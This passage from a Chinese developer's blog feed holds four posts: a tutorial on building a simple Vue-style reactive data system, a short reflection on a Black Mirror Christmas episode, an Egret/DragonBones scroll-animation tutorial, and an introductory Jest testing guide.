 Target = fn;</span><br><span class="line">    data[key];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$watch(&apos;name&apos;, () =&gt; &#123;</span><br><span class="line">    console.log(&apos;设置了name&apos;);</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">$watch(&apos;name&apos;, () =&gt; &#123;</span><br><span class="line">    console.log(&apos;多重依赖，啦啦啦&apos;);</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">data.name = &apos;zhou shaw&apos;;</span><br></pre></td></tr></table></figure><p>上述代码并未对其<code>data</code>属性进行数据响应，我们可以通过遍历添加依赖关系。并且我们会发现若我们通过访问数据便收集了依赖，那么会触发大量的重复依赖收集后面我们会讲解如何解决：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">var data = &#123;</span><br><span class="line">    name: &apos;shaw&apos;,</span><br><span class="line">    age: 23</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">let Target; // 用于缓存依赖函数</span><br><span class="line"></span><br><span class="line">for (let key in data) &#123;</span><br><span class="line">    let dep = [];</span><br><span class="line">    let val = data[key];</span><br><span class="line">    Object.defineProperty(data, key, &#123;</span><br><span class="line">        set(newValue) &#123;</span><br><span class="line">            if (val === newValue) return; // 设置新值与旧值相等，不进行依赖</span><br><span class="line">            val = newValue</span><br><span class="line">            dep.forEach(fn =&gt; fn()); // 执行依赖</span><br><span class="line">        &#125;,</span><br><span class="line">        get() &#123;</span><br><span class="line">            if (Target) dep.push(Target); // 有依赖进行收集</span><br><span class="line">            return val;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">let $watch = function (key,fn) &#123;</span><br><span class="line">    Target = fn;</span><br><span class="line">    data[key];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但如果数据结构是这样呢：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">var data = &#123;</span><br><span class="line">    name: &apos;shaw&apos;,</span><br><span class="line">    infos: &#123;</span><br><span class="line">        phone: &apos;17xxx&apos;,</span><br><span class="line">        wechat: &apos;xxx&apos;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>我们会发现我们并没有对深层次对象监听，如果数据结构更为复杂呢，我们可以将数据拦截方法封装成一个函数，对数据对象进行递归遍历，将所有属性都添加依赖，</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">let Target; // 用于缓存依赖函数</span><br><span class="line"></span><br><span class="line">function walk(data) &#123;</span><br><span class="line">    for (let key in data) &#123;</span><br><span class="line">        let dep = [];</span><br><span class="line">        let val = data[key];</span><br><span class="line">        // 当数据为对象类型时递归遍历</span><br><span class="line">        if (Object.prototype.toString.call(val) === &apos;[object Object]&apos;) &#123; </span><br><span class="line">            walk(val);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Object.defineProperty(data, key, &#123;</span><br><span class="line">            set(newValue) &#123;</span><br><span class="line">                if (val === newValue) return; // 设置新值与旧值相等，不进行依赖</span><br><span class="line">                val = newValue</span><br><span class="line">                dep.forEach(fn =&gt; fn()); // 执行依赖</span><br><span class="line">            &#125;,</span><br><span class="line">            get() &#123;</span><br><span class="line">                if (Target) dep.push(Target); // 有依赖进行收集</span><br><span class="line">                return val;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">walk(data);</span><br><span class="line"></span><br><span class="line">let $watch = function (key,fn) &#123;</span><br><span class="line">    Target = fn;</span><br><span class="line">    data[key];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>尽管对数据进行深度观察了，但我们会发现，我们的<code>watch</code>函数并不会对<code>infos.wechat</code>进行观察，所以我们需要对<code>$watch</code>函数进行改造，让其支持<code>infos.wechat</code>依赖收集，所以我们想实现的效果是：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$watch(&apos;infos.wechat&apos;, () =&gt; &#123;</span><br><span class="line">    console.log(&apos;修改了wechat&apos;);</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>由于我们已经实现了数据进行访问即可收集依赖，但我们无法直接通过<code>infos.wechat</code>收集，我们需要将其转换成<code>data[&#39;infos&#39;][&#39;wechat&#39;]</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">var data = &#123;</span><br><span class="line">    name: &apos;shaw&apos;,</span><br><span class="line">    infos: &#123;</span><br><span class="line">        wechat: &apos;466&apos;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">let $watch = function (key,fn) &#123;</span><br><span class="line"></span><br><span class="line">    Target = fn;</span><br><span class="line"></span><br><span class="line">    if (/\./.test(key)) &#123;</span><br><span class="line">        let paths = key.split(&apos;.&apos;);</span><br><span class="line">        let obj = data;</span><br><span class="line">        paths.forEach((path) =&gt; &#123;</span><br><span class="line">            obj = obj[path];</span><br><span class="line">        &#125;);</span><br><span class="line">        return;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    data[key];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>到这里为止我们已经实现了一个简单的数据依赖收集系统，我们如何实现dom节点和数据绑定式渲染呢，在vue中模板最终都会生成一个render函数，通过这个函数来实现最终的渲染。若<code>render</code>函数中访问了<code>data</code>数据，我们可以观察<code>render</code>函数中的data数据，若<code>render</code>函数中访问的数据发生变化，则执行<code>render</code>函数进行重新渲染，那么如何收集<code>render</code>函数中访问的依赖，并将<code>render</code>函数与数据建立联系呢，很简单我们将<code>watch</code>函数进行改造一下就行了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">let $watch = function (exp,fn) &#123;</span><br><span class="line"></span><br><span class="line">    Target = fn;</span><br><span class="line">    if (typeof exp===&quot;function&quot;) &#123;</span><br><span class="line">        exp();</span><br><span class="line">        return;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if (/\./.test(exp)) &#123;</span><br><span class="line">        let paths = exp.split(&apos;.&apos;);</span><br><span class="line">        let obj = data;</span><br><span class="line">        paths.forEach((path) =&gt; &#123;</span><br><span class="line">            obj = obj[path];</span><br><span class="line">        &#125;);</span><br><span class="line">        return;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    data[exp];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function render() &#123;</span><br><span class="line">    return document.write(`姓名：$&#123;data.name&#125;; 年龄：$&#123;data.age&#125;&lt;br/&gt;`)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$watch(render, render)</span><br></pre></td></tr></table></figure><p>在这里我们将<code>$watch</code>函数进行了改造，我们将第一个参数的表达是进行了类型判断，如果是函数类型进行执行。因为我们是通过<code>get</code>拦截进行依赖收集的，执行函数后可以收集<code>render</code>函数中数据的依赖，依赖的执行函数就是<code>render</code>，若我们对<code>render</code>函数中依赖的data数据进行修改，就会触发<code>render</code>函数从而实现数据响应视图。当然这里的实现只是vue的基本原理，从这里我们不难看出我们实现的这个简陋的响应系统中存在的问题，当修改数据触发<code>render</code>函数时，又进行了重复的依赖收集，并且这里也没有针对<code>Object.defineProperty</code>属性无法对数组进行观察进行处理。接下来会针对这一系列问题进行处理</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;数据响应系统的基本思路&quot;&gt;&lt;a href=&quot;#数据响应系统的基本思路&quot; class=&quot;headerlink&quot; title=&quot;数据响应系统的基本思路&quot;&gt;&lt;/a&gt;数据响应系统的基本思路&lt;/h2&gt;&lt;p&gt;我们都知道在&lt;code&gt;Vue&lt;/code&gt;中存在&lt;code&gt;wat
      
    
    </summary>
    
      <category term="vue" scheme="http://zhoushaw.github.io/categories/vue/"/>
    
    
      <category term="vue" scheme="http://zhoushaw.github.io/tags/vue/"/>
    
  </entry>
  
  <entry>
    <title>《黑镜》圣诞特别篇：人间地狱</title>
    <link href="http://zhoushaw.github.io/2019/06/14/other/life/%E9%BB%91%E9%95%9C-%E5%9C%A3%E8%AF%9E%E7%89%B9%E5%88%AB%E7%AF%87/"/>
    <id>http://zhoushaw.github.io/2019/06/14/other/life/黑镜-圣诞特别篇/</id>
    <published>2019-06-14T03:39:35.000Z</published>
    <updated>2019-06-15T15:57:16.697Z</updated>
    
    <content type="html"><![CDATA[<div><a id="more"></a></div><h2 id="故事简介"><a href="#故事简介" class="headerlink" title="故事简介"></a>故事简介</h2><p>　圣诞节将至，一间地处偏远的小木屋里，波特（拉菲·斯波 Rafe Spall 饰）和马特（乔恩·哈姆 Jon Hamm 饰）同坐一桌，用红酒和烤土豆庆祝这个银装素裹的节日。波特沉默寡言，无精打采，而马特却恰恰相反，为了逗波特讲话，他向波特讲述了自己的过去。<br>　　曾经的马特是一名“恋爱导师”，他通过摄像头和网络“远程操控”他的客户，让这些平日里无人问津的“宅男”们能够在派对山成功抱得美人归。然而，一场意外让马特决定永远离开这个他经营得风生水起的行当，此间究竟发生了什么？听了马特的叙述，波特终于决定向马特讲述自己的故事，这个故事关乎于他和他的女友，但并不完全关乎于爱情。　　</p><h2 id="随笔"><a href="#随笔" class="headerlink" title="随笔"></a>随笔</h2><p>看完黑镜的圣诞特别篇，感到特别沉重</p><p>人间有地狱吗，有！科技造就地狱，虽然影片中的科技现在还不存在，但是能真真切切的感受到与我们非常贴近，原来我们认为地狱是死后给恶人去的地方，但是科技可以将我们人类带往地狱！</p><p>想象你被全世界所有人屏蔽，你无法与其他人交流你看到的其他人一团模糊的白影，其他人也无法和你交流你也是一团影子。想象一下你的意识一分钟就是一千年，你无法做任何事情，在这千年里有一个永远关不掉的收音机，砸碎了，回头，发现还在，不停重复。这不是地狱是什么？</p>]]></content>
    
    <summary type="html">
    
      &lt;div&gt;
    
    </summary>
    
      <category term="life" scheme="http://zhoushaw.github.io/categories/life/"/>
    
    
      <category term="life" scheme="http://zhoushaw.github.io/tags/life/"/>
    
  </entry>
  
  <entry>
    <title>Egret实战-动态条漫</title>
    <link href="http://zhoushaw.github.io/2019/05/06/learning/game/egret%E5%AE%9E%E6%88%98/"/>
    <id>http://zhoushaw.github.io/2019/05/06/learning/game/egret实战/</id>
    <published>2019-05-05T23:42:00.000Z</published>
    <updated>2019-10-16T13:02:36.389Z</updated>
    
    <content type="html"><![CDATA[<h2 id="h5活动构建思路"><a href="#h5活动构建思路" class="headerlink" title="h5活动构建思路"></a>h5活动构建思路</h2><p>如何制作一个类似于中国女子图鉴的项目呢。</p><blockquote><p>扫码访问：</p></blockquote><p><img width="200" src="https://s10.mogucdn.com/mlcdn/c45406/191016_80d41jjj95ekblche4hh9f2l4lgb6_600x600.png"></p><blockquote><p>主要思路</p></blockquote><p>通过龙骨场景动画将将所有动画做成帧动画到龙骨中，通过滑动事件来控制帧切换的位置</p><blockquote><p>核心实现思想：</p></blockquote><ul><li>获取龙骨资源、并创建<code>dragonBones</code>实例对象。将龙骨场景对象添加至画布</li><li>构建一个滚动容器，容器的高度为视窗大小，设置宽度设置为视窗宽度，在滚动容器中内增加填充块,填充块的高度=<strong>(总的帧数<em> 滚动距离切换一帧 </em> 时间缩放) + 视窗高度</strong></li><li>创建<code>scroll</code>对象，将其设置为视窗大小，设置<code>滚动容器</code>对象为<code>scroll</code>的视域组件组件</li><li>使用<code>scroll</code>监听滚动高度，计算当前滚动条占总可滚动高度的百分比=“已滚动高度/(图片高度-视窗高度)”</li><li>获取<code>dragonBones</code>场景一共拥有多少帧，通过总帧数*当前百分比，得到用户滑动到当前所在帧数</li></ul><blockquote><p>对应知识点</p></blockquote><ul><li>滚动容器组件：<a href="http://developer.egret.com/cn/apidoc/index/name/eui.Scroller" target="_blank" rel="noopener">eui.scroller</a></li><li>龙骨动画控制：<a href="http://developer.egret.com/cn/apidoc/index/name/dragonBones.Animation" target="_blank" rel="noopener">dragonBones.animation</a></li></ul><blockquote><p>具体实现代码：</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">private timeScale: number = 2;  // 时间缩放倍数，为2时表明帧数切换放慢两倍</span><br><span class="line">private frameFactor: number = 26; // 滚动一帧需要耗费的距离</span><br><span class="line">private totalFrames: number = 1672; // 总得帧数</span><br><span class="line">private totalPrgress: number = this.timeScale * this.frameFactor * this.totalFrames; // 总的滚动长度</span><br><span class="line">private dragonBones: Common.DragonParse;</span><br><span class="line"></span><br><span class="line">constructor () &#123;</span><br><span class="line">    // 龙骨脚手架中已添加COMMON公共方法，用来解析龙骨资源</span><br><span class="line">    this.dragonBones = Common.DragonParse.getDragonParseInstance();</span><br><span class="line">    this.egretFactory = this.dragonBones.getEgretFactory();</span><br><span class="line">    </span><br><span class="line">    // 获取龙骨资源</span><br><span class="line">    this.armatureDisplay = this.egretFactory.buildArmatureDisplay(&apos;listen_mother&apos;);</span><br><span class="line">    this.addView();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">private addView () :void &#123;</span><br><span class="line">   // 获取视窗宽、高</span><br><span class="line">   const &#123; stageWidth, stageHeight &#125; = this.stage;</span><br><span class="line">   </span><br><span class="line">   // 创建滚动容器和填充块</span><br><span class="line">   const group = new eui.Group();</span><br><span class="line">   const placeHolder = new eui.Group();</span><br><span class="line"></span><br><span class="line">   placeHolder.width = stageWidth;</span><br><span class="line">   placeHolder.height = this.totalPrgress + stageHeight;</span><br><span class="line">   group.addChild(placeHolder);</span><br><span class="line"></span><br><span class="line">   //创建一个Scroller</span><br><span class="line">   this.scroller = new eui.Scroller();</span><br><span class="line">   this.scroller.bounces = false;</span><br><span class="line">   this.scroller.width = stageWidth;</span><br><span class="line">   this.scroller.height = stageHeight;</span><br><span class="line">   // 将group作为滚动的视域组件</span><br><span class="line">   this.scroller.viewport = group;</span><br><span class="line">   this.addChild(this.scroller);</span><br><span class="line">   </span><br><span class="line">   // 监听滚动变化</span><br><span class="line">    this.scroller.addEventListener(egret.Event.CHANGE, this.onScroll, this);</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">private onScroll () :void &#123;</span><br><span class="line">   // 获取滚动距离，并计算滚动百分比</span><br><span class="line">   const scrollV: number = this.scroller.viewport.scrollV;</span><br><span class="line">   const progress: number = scrollV / this.totalPrgress;</span><br><span class="line">   let curRateValue = ~~(this.totalFrames * progress);</span><br><span class="line"></span><br><span class="line">   this.setSwipeAndButton(curRateValue);</span><br><span class="line">   this.prevFrames = curRateValue;</span><br><span class="line">   </span><br><span class="line">   // 将设置龙骨动画播放到指定帧数</span><br><span class="line">   this.setProgress(progress);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">private setProgress (progress: number) :void &#123;</span><br><span class="line">   this.armatureDisplay.animation.gotoAndStopByProgress(this.animationName, progress)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="目录结构"><a href="#目录结构" class="headerlink" title="目录结构"></a>目录结构</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">|—— bin-debug   &lt;-编译后运行代码</span><br><span class="line">|—— libs        &lt;-第三方库</span><br><span class="line">|—— resource    &lt;-资源文件</span><br><span class="line">    |—— default.res.json    &lt;-资源索引目录</span><br><span class="line">    └── default.thm.json    &lt;-主题索引目录</span><br><span class="line">|—— scripts     &lt;-构建脚本</span><br><span class="line">|—— resource    &lt;-资源文件</span><br><span class="line">    |—— dragonbones    &lt;-龙骨资源目录</span><br><span class="line">        └── listen_mother    &lt;-母亲节活动龙骨资源</span><br><span class="line">|—— src         &lt;-项目源代码</span><br><span class="line">    |—— common          &lt;-公用方法库</span><br><span class="line">    |—— pages           &lt;-主要页面</span><br><span class="line">    |—— LoadingUI.ts    &lt;-loading组件</span><br><span class="line">    └── Main.ts         &lt;-入口文件</span><br><span class="line">└── template    &lt;-项目模板</span><br></pre></td></tr></table></figure><h2 id="制作场景动画"><a href="#制作场景动画" class="headerlink" title="制作场景动画"></a>制作场景动画</h2><blockquote><p>创建动画</p></blockquote><p><img width="300" src="https://s10.mogucdn.com/mlcdn/c45406/190515_2ghf8c42a3kji7l7l48e6jbkbafii_1050x672.png"></p><ul><li>选择创建龙骨动画</li></ul><blockquote><p>通过属性面板</p></blockquote><p><img width="200" src="https://s10.mogucdn.com/mlcdn/c45406/190512_1h0i16eg0f04lk03h128ih080ei3g_558x888.png"></p><ul><li>设置750宽、1260高</li><li>初始化起点位置，375、630</li></ul><h2 id="动画制作"><a href="#动画制作" class="headerlink" title="动画制作"></a>动画制作</h2><blockquote><p>逐帧动画和补间动画的差异</p></blockquote><ul><li>逐帧动画<ul><li>逐帧动画是在时间帧上逐帧绘制帧内容，每一帧带有不同的图</li><li>适合于表演很细腻的动画，如3D效果、人物或动物急剧转身等等效果</li><li>优点:有非常大的灵活性,表现任何想表现的内容</li><li>缺点:由于逐帧动画的帧序列内容不一样，不仅增加制作负担而且最终输出的文件量也很大</li></ul></li><li>补间动画<ul><li>只需要为动画的第一个关键帧和最后一个关键帧创建内容，两个关键帧之间帧的内容由龙骨自动生成，不需要人为处理</li><li>逐帧动画是由手工控制，帧与帧之间的过渡很可能会不自然、不连贯</li><li>过渡更为自然连贯。最后，相对于逐帧动画来说，补间动画的文件更小</li></ul></li></ul><h3 id="制作逐帧动画"><a href="#制作逐帧动画" class="headerlink" title="制作逐帧动画"></a>制作逐帧动画</h3><blockquote><p>起步</p></blockquote><ul><li>新建项目=&gt;创建龙骨动画=&gt;逐帧动画模板。</li><li>窗口菜单=&gt;属性面板</li><li>勾选画布=&gt;设定宽高=&gt;设定偏移方向</li><li>窗口菜单=&gt;资源面板</li><li>点击导入资源按钮或点击打开资源目录，将图片放入资源文件中</li><li>在资源面板拖入图片资源，即可</li></ul><blockquote><p>导出</p></blockquote><p>顶部栏导出按钮，按照默认“纹理集”即可</p><p><img width="400" src="https://s10.mogucdn.com/mlcdn/c45406/190515_3k31d6j2ijc64j232ke0d4b728c09_1080x70.png"></p><h3 id="制作补间动画"><a href="#制作补间动画" class="headerlink" title="制作补间动画"></a>制作补间动画</h3><p>补间动画思想：<strong>只需要为动画的第一个关键帧和最后一个关键帧创建内容，两个关键帧之间帧的内容自动生成，不需要人为处理</strong></p><blockquote><p>下面以龙骨动画的补间动画制作为例：</p></blockquote><p>在龙骨动画制作过程中，动画的对象必须以骨骼为单位</p><ul><li><p>切换至动画制作tab</p><ul><li><img width="400" src="https://s10.mogucdn.com/mlcdn/c45406/190515_5i77b4889d454d0aek8cif8l8beh6_844x384.png"></li></ul></li><li><p>进入场景后通过场景树选择需要制作动画的骨骼</p><ul><li><img width="200" src="https://s10.mogucdn.com/mlcdn/c45406/190515_5e4290dgi2g7c11c9h4061c4cblah_690x980.png"></li></ul></li><li><p>选中骨骼可进行：<strong>位移</strong>、<strong>旋转</strong>、<strong>缩放</strong>动画制作</p><ul><li>在时间轴上选中第0帧，在操作面板点击对应改变属性的旗子</li><li><img width="200" src="https://s10.mogucdn.com/mlcdn/c45406/190515_860j48c1g0f347e9jg553k8j6bl7h_1012x598.png"></li><li><img width="200" src="https://s10.mogucdn.com/mlcdn/c45406/190515_5g58g56ja53eil92eh6h12211ff0f_736x112.png"></li><li>选中第10帧，并通过操作面板或直接对骨骼记性属性更改</li><li><img width="200" src="https://s10.mogucdn.com/mlcdn/c45406/190515_7jieaa926glfbcc28i85i2hl03e1h_736x110.png"></li><li>点击黄色旗子，将会自动补充补间动画</li></ul></li><li><p>选中图片可进行：<strong>透明度</strong>、<strong>是否展示</strong></p><ul><li>打开属性面板</li><li><img width="100" src="https://s10.mogucdn.com/mlcdn/c45406/190515_436fehba4a05da0kg6hak2h268fc3_502x1000.png"></li><li>是否展示图片需要通过，自动关键</li><li><img width="100" src="https://s10.mogucdn.com/mlcdn/c45406/190515_2a4f690dl2caek417cf1ij40049dc_480x592.png"></li><li>自动关键帧开启后，会自动在当前关键帧记录所有的属性修改</li></ul></li></ul><h2 id="制作龙骨动画"><a href="#制作龙骨动画" class="headerlink" title="制作龙骨动画"></a>制作龙骨动画</h2><p><strong>龙骨动画一般用来制作人物行动，将人物整体作为骨架各部分作为骨骼，例如：手臂、大腿、小腿都是骨骼，其中大腿和小腿都是腿的子集</strong></p><blockquote><p>起步</p></blockquote><ul><li>新建项目=&gt;创建龙骨动画=&gt;龙骨动画模板</li><li>窗口菜单=&gt;属性面板</li><li>勾选画布=&gt;设定宽高=&gt;设定偏移方向</li><li>窗口菜单=&gt;资源面板</li><li>点击导入资源按钮或点击打开资源目录，将图片放入资源文件中</li><li>在资源面板拖入图片资源，即可</li><li>创建骨骼：在骨架装配tab栏=&gt;场景树中右击=&gt;插入=&gt;骨骼</li><li>将图片资源拖入骨骼中</li></ul><h3 id="一屏动画设计原则"><a href="#一屏动画设计原则" class="headerlink" title="一屏动画设计原则"></a>一屏动画设计原则</h3><ul><li>构建一个基本场景骨架，后续骨架放置基本骨架上，方便整体移动</li><li>物件退场需要与背景反方向运动，造成错落感。或顺方向退场，避免导致认为物品或人与背景不分离</li><li>龙骨动画设计时以最小十帧为单位，场景转换预留30~50帧，后续方便调整</li><li>帧动画设计图片以至少三帧不同动画，可以造成连续感</li><li>开始龙骨动画制作前，先确定好场景高度和宽度不会有大的变化，否则后续修改会造成整体调整</li><li>文字动画放置物品后</li><li>动画效果放置980像素内，否则在小屏幕手机上无法展示全面</li><li>帧动画切换中间过度衔接透明度变化</li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;h5活动构建思路&quot;&gt;&lt;a href=&quot;#h5活动构建思路&quot; class=&quot;headerlink&quot; title=&quot;h5活动构建思路&quot;&gt;&lt;/a&gt;h5活动构建思路&lt;/h2&gt;&lt;p&gt;如何制作一个类似于中国女子图鉴的项目呢。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;扫码访问：
      
    
    </summary>
    
      <category term="game" scheme="http://zhoushaw.github.io/categories/game/"/>
    
    
      <category term="egret" scheme="http://zhoushaw.github.io/tags/egret/"/>
    
  </entry>
  
  <entry>
    <title>Jest</title>
    <link href="http://zhoushaw.github.io/2019/05/04/learning/font-end/test/jest/"/>
    <id>http://zhoushaw.github.io/2019/05/04/learning/font-end/test/jest/</id>
    <published>2019-05-04T03:01:35.000Z</published>
    <updated>2019-05-12T06:26:35.668Z</updated>
    
    <content type="html"><![CDATA[<h2 id="起步"><a href="#起步" class="headerlink" title="起步"></a>起步</h2><blockquote><p>安装</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install --save-dev jest</span><br></pre></td></tr></table></figure><blockquote><p><code>pageckage.json</code>配置</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;scripts&quot;: &#123;</span><br><span class="line">    &quot;test&quot;: &quot;jest&quot;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Expect"><a href="#Expect" class="headerlink" title="Expect"></a>Expect</h2><p><code>Expect</code>是一个函数，第一个参数接收<code>value</code>,后面可接链式属性判断</p><ul><li><code>expect(value)</code><ul><li><code>expect(value).not.toEqual</code>: 与后面等式取反比较</li><li><code>toEqual(compareValue)</code>: <code>value</code> 与 <code>compareValue</code>必须完全相等</li></ul></li></ul><blockquote><p>自定义校验方法</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">// 查询对象key值是否存在对象中</span><br><span class="line">expect.extend(&#123;</span><br><span class="line">    toContainKeys(received, keys) &#123;</span><br><span class="line">        const receivedKeys = Object.keys(received);</span><br><span class="line">        const pass = keys.every((val =&gt; receivedKeys.includes(val)));</span><br><span class="line">        if (pass) &#123;</span><br><span class="line">            return &#123;</span><br><span class="line">                message: () =&gt;</span><br><span class="line">                `expected $&#123;JSON.stringify(received)&#125; have contain $&#123;receivedKeys&#125;`,</span><br><span class="line">                pass: true,</span><br><span class="line">            &#125;;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            return &#123;</span><br><span class="line">                message: () =&gt;</span><br><span class="line">                `expected $&#123;JSON.stringify(received)&#125; don&apos;t have contain $&#123;receivedKeys&#125;`,</span><br><span class="line">                pass: false,</span><br><span class="line">            &#125;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;起步&quot;&gt;&lt;a href=&quot;#起步&quot; class=&quot;headerlink&quot; title=&quot;起步&quot;&gt;&lt;/a&gt;起步&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;安装&lt;/p&gt;
&lt;/blockquote&gt;
